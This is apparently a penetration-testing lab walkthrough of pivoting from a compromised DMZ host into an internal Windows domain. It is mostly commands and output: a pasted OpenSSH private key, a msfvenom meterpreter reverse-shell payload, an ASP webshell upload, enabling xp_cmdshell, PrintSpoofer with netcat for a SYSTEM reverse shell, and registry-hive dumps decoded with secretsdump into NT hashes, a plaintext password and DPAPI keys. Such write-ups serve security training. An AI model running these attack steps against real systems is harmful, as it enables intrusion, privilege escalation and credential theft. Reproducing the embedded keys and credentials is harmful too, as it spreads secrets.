/W6B6WR5brkfWIhgzGZa92+IQEZG0AHNJeulA/jQfQYx96v5C/OK0QEjGfPMto1MJke+VM
P8JmcXlQ+RPsiRrlnfhJaaFrQ1us3p2X+m6kktlcC4W67N88iQFxtXhrBnuou5efQ99Ziz
lFCmcWKbHIh35Xw8gie/bIl127GUqeWVLwTraOiRdtD58vuk9JaL8DQojRM+2r4O6P++5V
rHwVRKYbT0G5k2cJHtTrYLw6htb+Gw1maijwADMYdF0MbHKcSO8BnFGW2XhfThwlo2N/ZA
VVzmxEdbgL15qCQ6++P/fjrBEF6IuaUoQexUr3AC5cPg01egKR8dt/TvL4Vv9GZMRMyYyI
7Y0TMjnCz7bRuc7mNX9hQbdqktcNFQAAAAMBAAEAAAGATL2yeec/qSd4qK7D+TSfyf5et6
Xb2x+tBo/RK3vYW8mLwgILodAmWr96249Brdwi9H8VxJDvsGX0/jvxg8KPjqHOTxbwqfJ8
OjeHiTG8YGZXV0sP6FVJcwfoGjeOFnSOsbZjpV3bny3gOicFQMDtikPsX7fewO6JZ22fFv
YSr65BXRSi154Hwl7F5AH1Yb5mhSRgYAAjZm4I5nxT9J2kB61N607X8v93WLy3/AB9zKzl
avML095PJiIsxtpkdO51TXOxGzgbE0TM0FgZzTy3NB8FfeaXOmKUObznvbnGstZVvitNJF
FMFr+APR1Q3WG1LXKA6ohdHhfSwxE4zdq4cIHyo/cYN7baWIlHRx5Ouy/rU+iKp/xlCn9D
hnx8PbhWb5ItpMxLhUNv9mos/I8oqqcFTpZCNjZKZAxIs/RchduAQRpxuGChkNAJPy6nLe
xmCIKZS5euMwXmXhGOXi0r1ZKyYCxj8tSGn8VWZY0Enlj+PIfznMGQXH6ppGxa0x2BAAAA
wESN/RceY7eJ69vvJz+Jjd5ZpOk9aO/VKf+gKJGCqgjyefT9ZTyzkbvJA58b7l2I2nDyd7
N4PaYAIZUuEmdZG715CD9qRi8GLb56P7qxVTvJn0aPM8mpzAH8HR1+mHnv+wZkTD9K9an+
L2qIboIm1eT13jwmxgDzs+rrgklSswhPA+HSbKYTKtXLgvoanNQJ2//ME6kD9LFdC97y9n
IuBh4GXEiiWtmYNakti3zccbfpl4AavPeywv4nlGo1vmIL3wAAAMEA7agLGUE5PQl8PDf6
fnlUrw/oqK64A+AQ02zXI4gbZR/9zblXE7zFafMf9tX9OtC9o+O0L1Cy3SFrnTHfPLawSI
nuj+bd44Y4cB5RIANdKBxGRsf8UGvo3wdgi4JIc/QR9QfV59xRMAMtFZtAGZ0hTYE1HL/8
sIl4hRY4JjIw+plv2zLi9DDcwti5tpBN8ohDMA15VkMcOslG69uymfnX+MY8cXjRDo5HHT
M3i4FvLUv9KGiONw94OrEX7JlQA7b5AAAAwQDihl6ELHDORtNFZV0fFoFuUDlGoJW1XR/2
n8qll95Fc1MZ5D7WGnv7mkP0ureBrD5Q+OIbZOVR+diNv0j+fteqeunU9MS2WMgK/BGtKm
41qkEUxOSFNgs63tK/jaEzmM0FO87xO1yP8x4prWE1WnXVMlM97p8osRkJJfgIe7/G6kK3
9PYjklWFDNWcZNlnSiq09ZToRbpONEQsP9rPrVklzHU1Zm5A+nraa1pZDMAk2jGBzKGsa8
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----

On 
$ echo "-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----" > dmz01_key
$ chmod 600 dmz01_key

Using Proxychains over 8081 
$ ssh -i dmz01_key -D 8081 root@10.129.25.193

This dropped us into a root shell on dmz01

Changing proxy.conf file 

Sudo nano /etc/proxychains.conf

Added this at the bottom 
socks4 	127.0.0.1 8081

```
$ grep socks4 /etc/proxychains.conf
#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5, raw
socks4 	127.0.0.1 8081
```

$root@dmz01: 
SNIP
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb0:72c5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:72:c5  txqueuelen 1000  (Ethernet)
        RX packets 756  bytes 51213 (51.2 KB)
        RX errors 0  dropped 29  overruns 0  frame 0
        TX packets 34  bytes 2856 (2.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
SNIP

$ sudo proxychains nmap -sT -Pn -p 21,22,80,8080 172.16.8.120
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 10:34 CST
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.120:8080  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.120:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.120:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.120:80  ...  OK
Nmap scan report for 172.16.8.120
Host is up (0.010s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds

Created a reverse TCP msfvenom file
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f elf > shell.elf

Transfer the file
$ scp -i dmz01_key shell.elf root@10.129.25.61:/tmp

Next, set up Metasploit

$sudo msfconsole -q

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.10 
lhost => 10.10.14.10
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.10:443
```

![[Pasted image 20260204123927.png]]

root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf

![[Pasted image 20260204124022.png]]

Next, we  set up routing using the `post/multi/manage/autoroute` module

```
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute c
                                       ommand (Accepted: add,
                                       autoadd, print, delete,
                                        default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.2
                                       55.255.0" or CIDR as "/
                                       24"
   SESSION                   yes       The session to run this
                                        module on
   SUBNET                    no        Subnet (IPv4, for examp
                                       le, 10.10.10.0)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
subnet => 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
[*] Running module against 10.129.25.61 (10.129.25.61)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

Once both options were set up, we began hunting for live hosts. Using our Meterpreter session, we can used the `multi/gather/ping_sweep` module to perform a ping sweep of the `172.16.8.0/23` subnet.

```shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

![[Pasted image 20260204124639.png]]

Alternatively, we could have done a ping sweep from the dmz01 host:

![[Pasted image 20260204124808.png]]

**Transferred a static nmap to the dmz01 victim host**

$ curl -L -o nmap-static 'https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap'
$ scp -i dmz01_key nmap-static root@10.129.27.114:/tmp/nmap
root@dmz01:/tmp# chmod +x /tmp/nmap
root@dmz01:/tmp# echo "172.16.8.3 172.16.8.20 172.16.8.50" > live_hosts
root@dmz01:/tmp# /tmp/nmap -Pn --open -iL live_hosts

``` nmap-scan
Nmap scan report for 172.16.8.3
Host is up (0.00053s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B0:53:43 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00046s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B0:3D:D0 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00030s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B0:46:9A (Unknown)
```

- 172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)
- 172.16.8.20 is a Windows host, and the ports `80/HTTP` and `2049/NFS` are particularly interesting
- 172.16.8.50 is a Windows host as well, and port `8080` sticks out as non-standard and interesting

## 172.16.8.3 - Domain Controller

Used enum4linux to check against the Domain Controller for SMB NULL sessions. 
$ git clone https://github.com/CiscoCXSecurity/enum4linux
$ chmod +x enum4linux/enum4linux.pl
$ proxychains enum4linux/enum4linux.pl -U -P 172.16.8.3


```
$ proxychains enum4linux/enum4linux.pl -r -U -P 172.16.8.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
"my" variable $which_output masks earlier declaration in same scope at enum4linux/enum4linux.pl line 280.
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Feb 10 14:00:54 2026

 =========================================( Target Information )=========================================

Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.16.8.3 )=============================

[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16

[E] Can't find workgroup/domain



 ====================================( Session Check on 172.16.8.3 )====================================

[proxychains] DLL init: proxychains-ng 4.16

[+] Server 172.16.8.3 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.16.8.3 )=================================

[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
Domain Name: INLANEFREIGHT
Domain Sid: S-1-5-21-2814148634-3729814499-1637837074

[+] Host is part of a domain (not a workgroup)


 ========================================( Users on 172.16.8.3 )========================================

[proxychains] DLL init: proxychains-ng 4.16

[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED


[proxychains] DLL init: proxychains-ng 4.16

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =============================( Password Policy Information for 172.16.8.3 )=============================


[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/



 ===================( Users on 172.16.8.3 via RID cycling (RIDS: 500-550,1000-1050) )===================

[proxychains] DLL init: proxychains-ng 4.16

[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

[proxychains] DLL init: proxychains-ng 4.16
enum4linux complete on Tue Feb 10 14:01:05 2026

```

From here, this was a dead end and we moved onto 172.16.8.50

## 172.16.8.50 - Tomcat

Checking this website from the pivot host shows Tomcat 10.0 installed

```
root@dmz01:/tmp# curl http://172.16.8.50:8080



<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/10.0.21</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
```

We then used **auxiliary/scanner/http/tomcat_mgr_login** module to attempt to brute-force the login.

```
[msf](Jobs:0 Agents:0
) auxiliary(scanner/http/tomcat_mgr_login) >> setg Proxies SOCKS4:127.0.0.1:8081
Proxies => SOCKS4:127.0.0.1:8081
[msf](Jobs:0 Agents:0
) auxiliary(scanner/http/tomcat_mgr_login) >> setg ReverseAllowProxy true
ReverseAllowProxy => true
[msf](Jobs:0 Agents:0
) auxiliary(scanner/http/tomcat_mgr_login) >> set rport 8080
rport => 8080
[msf](Jobs:0 Agents:0
) auxiliary(scanner/http/tomcat_mgr_login) >> run
[!] No active DB -- Credential data will not be saved!
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:QLogic66 (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:password (Incorrect)

<SNIP>

[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:password1 (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:password (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat: (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

This also appears to be a dead end.

Before moving on we did a tcpdump, to "listen on the wire"

root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

We transferred this to our host to review with Wireshark. After transferring the file down to our host, we opened it in Wireshark but saw that nothing of note was captured.

## 172.16.8.20 - DotNetNuke (DNN)

From the Nmap scan, we saw ports `80` and `2049` open.

```
$ proxychains curl http://172.16.8.20
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:80  ...  OK
<!DOCTYPE html>
<html  lang="en-US">
<head id="Head"><meta content="text/html; charset=UTF-8" http-equiv="Content-Type" /><title>
	Home

<SNIP>

      <span class="overlay">
                        <p>Informative and entertaining, challenging and educational, the DNN Community Blogs always have fresh content, fresh ideas and new opinions. Dive right in.</p>
                        <label>Visit DNN Blogs</label>
                    </span> 
                    <span class="text">Blogs</span> 

```

cURLing this domain allows us to view the HTTP response. It looks like DotNetNuke (DNN) is running on the target. We confirmed this by browsing directly to the target from our attack host, passing the traffic through the SOCKS proxy.

![[Pasted image 20260210152052.png]]

![[Pasted image 20260210152147.png]]

Browsing to http://172.16.8.20/Login?returnurl=%2fadmin shows us the admin login page. 

![[Pasted image 20260210152139.png]]

Attempting to register gives us the message - **"An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site."**

Since Port 2049 is open we checked the NFS server to see if it's misconfigured and potentially could be exploited.
```
$ proxychains showmount -e 172.16.8.20
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:111  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:2049  ...  OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

We can't mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try. We see a few files related to DNN and a `DNN` subdirectory.

```
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/DNN
root@dmz01:/tmp/DEV01/DNN# ls
App_LocalResources                Objects
Browser                           Options.aspx
bundleconfig.json                 Options.aspx.cs
CKEditorOptions.ascx              Options.aspx.designer.cs
CKEditorOptions.ascx.cs           packages.config
CKEditorOptions.ascx.designer.cs  Properties
CKEditorOptions.ascx.resx         UrlControl.ascx
CKFinder                          Utilities
CKHtmlEditorProvider.cs           WatchersNET.CKEditor.csproj
Constants                         Web
Content                           web.config
Controls                          web.Debug.config
Extensions                        web.Deploy.config
Install                           web.Release.config
Module
```

The `DNN` subdirectory is very interesting as it contains a `web.config` file.

```
root@dmz01:/tmp/DEV01/DNN# cat web.config
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>

```

Creds ```Administrator:D0tn31Nuk3R0ck$$@123``` are leaked in here. It appears to be the administrator password for the DNN instance.

Logged into the DNN admin account 

![[Pasted image 20260211091957.png]]![[Pasted image 20260211092137.png]]

A SQL Console is accessible under the Settings page which is interesting.

![[Pasted image 20260211092309.png]]
Console is blocking xp_cmdshell, we enabled xp_cmdshell by pasting the following lines into the query and clicking Run Script -

```shell-session
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

![[Pasted image 20260211092536.png]]
Now we have **command execution** via the **SQL Console**.

The allowed file extensions list was  modified to include .asp, .aspx and exe by browsing to `Settings -> Security -> More -> More Security Settings` and adding them under `Allowable File Extensions`, and clicking the `Save` button.

Downloaded an ASP webshell 

$ wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/asp/webshell.asp

Navigated to http://172.16.8.20/admin/file-management and uploaded the webshell
![[Pasted image 20260211094359.png]]
Right-click to simply Get URL 

![[Pasted image 20260211094434.png]]
After navigating to this URL, we have a working webshell on the server

![[Pasted image 20260211094525.png]]
SeImpersonatePrivilege being Enabled is a gem for escalating privileges to **SYSTEM**. To exploit this we need to transfer PrintSpoofer and nc over to DEV01

$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
$ sudo mv /usr/share/seclists/Web-Shells/FuzzDB/nc.exe ~
$ scp -i dmz01_key PrintSpoofer64.exe nc.exe root@10.129.229.147:/tmp/

root@dmz01:/tmp# python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...

On webshell entered the following two commands to transfer PrintSpoofer64 and nc from the pivot host

```
powershell -c "Invoke-WebRequest -Uri http://172.16.8.120:9999/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe"
powershell -c "Invoke-WebRequest -Uri http://172.16.8.120:9999/nc.exe -OutFile C:\Windows\Temp\nc.exe"
```
![[Pasted image 20260217133417.png]]
They are now located in C:\Windows\Temp\ on DEV01
![[Pasted image 20260211101707.png]]

On pivot machine 
root@dmz01:/tmp# nc -lvnp 4444
Listening on 0.0.0.0 4444

On the webshell ran the following command

```
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 172.16.8.120 4444 -e cmd"
```

Which dropped me into a NT Authority/System reverse shell 
![[Pasted image 20260217133528.png]]

Changed directory to "C:\DotNetNuke\Portals\0>" which is the DNN file management page
From here we began the post exploitation phase

```
C:\DotNetNuke\Portals\0>reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE
The operation completed successfully.

C:\DotNetNuke\Portals\0>reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
The operation completed successfully.

C:\DotNetNuke\Portals\0>reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE
The operation completed successfully.
```

Next, we modified the Allowable File Extensions to allow SAVE files to be permitted via `Settings -> Security -> More -> More Security Settings` and adding "SAVE" under `Allowable File Extensions`

![[Pasted image 20260211111150.png]]
We downloaded each of the .SAVE files which allowed us to use secretsdump.py to dump the SAM database and retrieve a set of credentials from LSA secrets.

```secretsdump
$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:f7293a72487071d52d5d08e8de1a218ae6fc3d4598d9d8d14c33d590961a0523b8396d43ed8cb59632aa3e44fad3344604c6dc4f9b8c2569c2616972ddbbdbd3ee212e75262b781a4b70e93d4439ffe363c7afa8a67e0d569624132bdfd60950cb3e815178824d63ebb4b14ab4952231a5daae7b4af758eaf7663c85736647ea7ae691a4a3a6d8efadd582da4023d6ee76a9499153a44d9a7d701980d4853287eb049b9c0a78f0963d57ae896e369d851d5cfa53f335a0d45d9ae187213237c17a5e98cd05b450ed56dcc6eeff706e2c8971b92ba951624f1ad9c765b311395daced562156102f6646e65c261337fcfb
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e2234dd18b8e855ed5777c4190ab6d40
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
